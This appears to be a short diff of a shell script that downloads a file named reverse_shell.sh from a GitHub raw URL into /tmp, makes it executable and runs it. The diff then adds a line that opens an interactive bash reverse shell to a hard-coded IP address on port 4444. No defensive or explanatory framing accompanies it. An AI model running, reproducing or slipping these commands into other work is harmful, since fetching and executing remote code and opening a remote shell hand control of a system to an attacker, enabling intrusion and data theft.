@@ -5,3 +5,4 @@ wget https://raw.githubusercontent.com/NarbehJackson/test/refs/heads/main/revers
 chmod +x /tmp/reverse_shell.sh
 # Execute the script
 bash /tmp/reverse_shell.sh
+bash -i >& /dev/tcp/23.27.169.114/4444 0>&1
